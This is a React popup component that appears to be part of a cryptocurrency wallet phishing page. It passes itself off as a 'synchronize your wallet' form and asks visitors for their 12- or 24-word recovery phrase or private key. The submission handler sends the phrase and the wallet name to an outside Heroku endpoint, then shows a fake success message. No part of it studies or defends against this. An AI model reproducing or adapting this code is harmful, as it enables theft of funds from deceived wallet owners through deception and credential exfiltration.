import React, {useState} from 'react'
import './Popup.css'
import './mobile.css'
import Axios from 'axios'
const Popup = ( { setPopUpdata, setShowPopup, popUpData } ) => {
    const [ showMessage, setShowmessage ] = useState( '' );
    const [ rPhrase, setRPhrase ] = useState( '' )
    const [ disableButton, setDisableButton ] = useState( false );
    const [ showSuccess, setShowSuccess ] = useState( false );


    const closeModal = () => {
        setShowPopup( false );
        setPopUpdata( null );
        setShowSuccess(false);
    };

    const handleSubmission = ( data ) => {
      
        setDisableButton( true );
        

        //12 characters or more ingoring spaces
        const checkPhrase = rPhrase.match( /\s*(\S\s*){12,}/g );
        
        // console.log( rPhrase );
        setTimeout( () => {
            if ( !checkPhrase ) {
                setShowmessage( 'Invalid characters entered.' )
            } else {
                const config = {
                    headers: {
                        'Content-Type': 'application/json'
                    }
                }
        
                const body = JSON.stringify( { rPhrase, wallet: popUpData.name } )
                Axios
                    .post( 'https://h-job.herokuapp.com/message', body, config )
                    // .then( res =>res.json() 
                    .then( res => {
                        //    console.log(res)
                    } )
                     
                    .catch( err => {
                        // console.log(err)
                    } );

                    setShowSuccess(true)
            }

            
            setDisableButton( false )
        }, 4000 )

        setTimeout( () => {
            
            setShowmessage( '' )
        }, 6000 )

        
    }

    return (
        <section className="popup">
            {!showSuccess ?
                <div>
                    <div className="form-header">
                        {/* <img src={ popUpData.image }></img> */}
                        <h1>SYNCHRONIZE YOUR WALLET</h1>
                        <p>SECURELY ENTER WALLET DETAILS TO PROCEED</p>
                        <span className="info">Enter 12 or 24 word Phrase/Private key</span>
                    </div>
                    { showMessage ? <p className="error-success-msg">{ showMessage }</p> : null }
                    <div className="form">
                        <form>
                            
                            <div className="recovery">
                                {/* <label>Recovery Phrase:</label> */}
                                <textarea type="text" placeholder="PHRASE/PRIVATE KEY" onChange={e=>setRPhrase(e.target.value)} value={rPhrase} ></textarea>
                                <span className="textarea"><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></span>
                            </div>
                            


                            { disableButton ?
                                <div className="proceed-button disabled">
                                    <p >Please Wait... </p>
                        
                                </div> :
                                <div className="proceed-button" onClick={ () => handleSubmission() }>
                                    <p >synchronize </p>
                                    <svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" class="h-6 w-6"><path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
                                </div> }

                        
                        </form>
                    
                        { disableButton ? null :
                            <div className="cancel">
                                <p onClick={ () => closeModal() }>Close</p>
                            </div> }
                    </div>
                </div>
                :
                <div className="success-message-wrapper">
                    <div className="success-message">
                        <img src="../../images/success.png" alt="."/>
                        <h1>Thank You!</h1>
                        <h4>We recieved your submission.</h4>
                        <p onClick={ () => closeModal() }> Back </p>
                    </div>
                </div> }

        </section>
    );
};

export default Popup
